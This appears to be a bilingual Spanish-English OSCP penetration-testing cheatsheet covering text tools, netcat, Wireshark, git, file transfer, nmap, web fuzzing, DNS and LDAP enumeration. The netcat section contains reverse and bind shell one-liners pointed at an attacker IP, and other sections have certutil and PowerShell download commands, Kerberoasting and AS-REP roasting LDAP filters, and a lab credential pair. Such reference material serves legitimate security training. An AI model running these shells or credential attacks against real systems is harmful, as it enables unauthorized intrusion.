# OSCP_Command_Cheatsheet

Spanglish included, this is a cheatsheet. 

## Misc Commands from Linux

### Strings and files manipulation

```
# Extract gz file
gunzip acces.log.gz

# Extract tar.gz file
tar -xzvf file.tar.gz

# Search for a string in command history
history | grep frase_a_buscar

# Count lines
wc -l index.html

 # Visualizar el principio/fin de un fichero	
head/tail index.html

# Find a search for a file that contains a specific string in it’s name
find / -name sbd\*

# Extraer todas las líneas que tienen una string 	
grep "href=" index.html

# Cortar una string por un delimitador, filtrar los resultados con grep y ordenarlos
grep "href=" index.html | cut -d "/" -f 3 | grep "\\." | cut -d '"' -f 1 | sort -u

# Sustituir una determinada cadena por otra
cat algo.txt | awk '{sub(/<cadena_a_sustituir>/,<cadena_a_introducir>);print}'

# Eliminar columna de un fichero de texto delimitada por un separador
cat algo.txt | awk -F: '{print $1":"$3}'

# Descodificar desde base64
echo -n "QWxhZGRpbjpvcGVuIHNlc2FtZQ==" | base64 --decode

# Codificar a base64
echo -n "algo" | base64

# Descodificar desde HEX
echo -n "46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874" | xxd -r -ps

# Mostrar el contenido de un fichero usando grep y REGEX para filtrar
cat index.html | grep -o 'http://\[^"\]\*' | cut -d "/" -f 3 | sort –u > list.txt

# Ordenar por frecuencia y mostrar todas las IP's presentes en un fichero LOG
cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn

```

### Some Netcat (nc, nc.exe, ncat) commands 

```

# Conectarse a otro puerto en otro host
nc -nv <ip_address> 110

# Poner puerto a la escucha
nc -nlvp 4444

# Enviar un fichero usando netcat
nc -nv <ip_address> 444 < /usr/share/windows/nc.exe

# Recibir fichero con netcat
nc -lvpn 4444 > incoming_file.exe

# Bind Shell con netcat en windows
nc.exe -nlvp 3344 -e cmd.exe

# Reverse shell con netcat en windows
nc.exe -nv <attacker_IP_address> <PORT> -e cmd.exe

# Bind Shell con netcat en linux
nc.exe -nlvp 3344 -e /bin/bash

# Reverse shell con netcat en linux
nc -nv <attacker_ip_address> 44444 -e /bin/bash

# Bind shell from windows
ncat --exec cmd.exe --allow <attacker_ip> -vnl 4444 --ssl

# Listen on port 444 using ssl
ncat -v <attacker_ip_Address> 444 --ssl

```

### Wireshark Filters and pcap related

```
# Filtro para mostrar trafico en puerto SMTP (25) y ICMP
tcp.port eq 25 or icmp

# Mostrar solo tráfico LAN (sin salida a Internet)
ip.src==192.168.0.0/16 and ip.dst==192.168.0.0/16

# Filtrar por protocolo (ejemplo SIP) y eliminar tráfico de IP's no deseadas
ip.src !=xxx.xxx.xxx.xxx && ip.dst != xxx.xxx.xxx.xxx && sip

# Mostrar un ficher pcap
tcpdump -r passwordz.pcap

# Mostrar solo IP's y ordenarlas
tcpdump -n -r passwordz.pcap | awk -F" " '{print $3}' | sort -u | head

# Capturar paquetes en el puerto 80
tcpdump tcp port 80 -w output.pcap -i eth0

```

### Basic AF git commands

```

# Enumerar todos los archivos nuevos o modificados que se deben confirmar
git status

# Toma una instantánea del archivo para preparar la versión
git add [file]

# Mover el archivo del área de espera, pero preservar su contenido
git reset [file]

# Registra las instantáneas del archivo permanentemente en el historial de versión
git commit -m "[descriptive message]"

# Mostrar las diferencias de archivos que no se han enviado aún al área de espera
git diff

# Mostrar las diferencias del archivo entre el área de espera y la última versión del archivo
git diff --staged

# Enumerar el historial de la versión para la rama actual
git log

# Enumerar el historial de versión para el archivo, incluidos los cambios de nombre
git log --follow [file]

# Producir metadatos y cambios de contenido del commit especificado
 git show[commit]

# Cambia a la rama especificada y actualiza el directorio activo
git checkout <commit_hash>

# Establecer el nombre que desea esté anexado a sus transacciones de commit
git config --global user.name "[name]"

# Establecer el e-mail que desea esté anexado a sus transacciones de commit
git config --global user.email "[email address]"

# Habilitar la útil colorización del producto de la línea de comando
git config --global color.ui auto

```

### Remote Desktop

```

# Using xfreerdp
 xfreerdp /u:'domain\user' /p:'Password' /v:host_ip:3389 (or another port if 3389 is not the case)

# Using rdekstop
rdesktop ip_address -k es -u user -p pass -d domain

```

### Transfer files to windows

```
# En la máquina kali)
python -m http.server

# Con certutil
# En windows 
certutil.exe -f -urlcache -split http://ip_kali:8000/fichero fichero

# Con powershell
# En windows     
new-object net.webclient).DownloadFile('http://ip_kali:8000/fichero', 'fichero')      # Opción 1
powershell Invoke-WebRequest "http://ip_kali:8000/fichero" -OutFile "fichero"         # Opción 2

```

## Port Scanning

```

# Puertos abiertos
sudo nmap -sS -p- --min-rate 10000 -oN hostnameOpenPorts hostname

# Servicios y versiones
map -sS -sV -O -sC --min-rate 1000 -p25,80,110,135,139,143,445,587,5985,47001 -oN hostnameServiceVersions hostname

```

## Web Directory Scanning (and related)

```

# GoBuster
gobuster dir -u <URL> -w <wordlist> -x <desired_extensions> -k

# FeroxBuster (makes the search recursively)
feroxbuster -k -u <url> -x php -o <output> -w <wordlist>

# Parameter Fuzzing using ffuf
ffuf -w burp-parameter-names.txt -u http://domain.com/index.php?FUZZ=id -fw <numero de palabras en la respuesta legítima>

# Search for plugins in Wordpress Sites
ffuf -w Bug-Bounty-Wordlists/wp-plugins.txt-u http://domain.com/wp-content/plugins/FUZZ 

# IIS Short Name Scan (using 20 threads and showing progress)
java -jar iis_shortname_scanner.jar 2 20 http://example.com/folder/

# Shortscan (another option to scan 8.3 file names)
go/bin/shortscan http://url

```

## DNS Enumeration

```
# Búsqueda d ehosts con Nmap
nmap -F --dns-server <dns server ip> <target ip range>

# Consulta DNS normal
dig A @nameserver_ip domain-name-here.com 

# Any information
dig ANY @<DNS_IP> <DOMAIN>    

# IPv6 DNS request
dig AAAA @<DNS_IP> <DOMAIN>    

# Information
dig TXT @<DNS_IP> <DOMAIN>

# Registros MX    
dig MX @<DNS_IP> <DOMAIN>

# ¿Qué DNS resuelve este nombre? 
dig NS @<DNS_IP> 

# Búsqueda inversa      
dig -x 192.168.0.2 @<DNS_IP>

# Búsqueda inversa IPv6
dig -x 2a00:1450:400c:c06::93 @<DNS_IP>

# Transferencia de Zona sin especificar nombre de dominio
dig axfr @<DNS_IP>

# Transferencia de zona especificandeo nombre de dominio
dig axfr  @<DNS_IP> <DOMAIN>

```

## Enumerar LDAP manualmente usando consola Python (más en ![Jonlabelle Gist](https://gist.github.com/jonlabelle/0f8ec20c2474084325a89bc5362008a7) 

```
>>> import ldap3
>>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True)
>>> connection = ldap3.Connection(server) # Conexión anónima
>>> connection=ldap3.Connection(server, 'SVC_TGS', 'GPPstillStandingStrong2k18') # Conexión usando credenciales
>>>  connection.bind()
# El servidor devolverá True o False indicando si la conexión se ha realizado correctamente o no.
>>> server.info
# El servidor devolverá info del dominio
# A continuación incluyo algunas búsquedas útiles.
# Todos los objetos del dominio
>>> connection.search('dc=DOMAIN,dc=DOMAIN', '(objectclass=*)')
>>> connection.entries # Para ver los resultados de la búsqueda
# Todos los objetos del dominio y susu atributos
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
>>> connection.entries
# Búsqueda de usuarios AS_REProastables (no necesitan pre-autenticación de Kerberos) 
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))', search_scope='SUBTREE', attributes='*')
>>> connection.entries
# Búsqueda de usuarios con servicios asociados (Para Kerberoasting)
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(samAccountType=805306368)(servicePrincipalName=*))', search_scope='SUBTREE', attributes='*')
>>> connection.entries
# Búsqueda de todos los atributos de un usuario
>>> connection.search(search_base='cn=users,dc=support,dc=htb',search_filter='(sAMAccountName=<username>)', search_scope='SUBTREE', attributes='*')
>>> connection.entries
